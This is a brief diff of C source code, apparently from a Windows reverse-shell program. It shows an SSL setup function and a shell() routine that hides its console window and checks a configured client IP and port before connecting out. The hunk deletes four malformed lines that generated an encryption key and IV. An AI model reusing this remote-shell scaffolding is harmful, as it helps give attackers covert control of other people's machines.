@@ -46,10 +46,6 @@ void configure_context(SSL_CTX *ctx)
 }
 int shell() {
 	FreeConsole();
-	static const unsigned char key[]; 
-	RAND_BYTES(key, 32);
-	static const unsigned char iv[];
-	RAND_BYTES(iv, 16)
     if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
 		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
 		return (1);
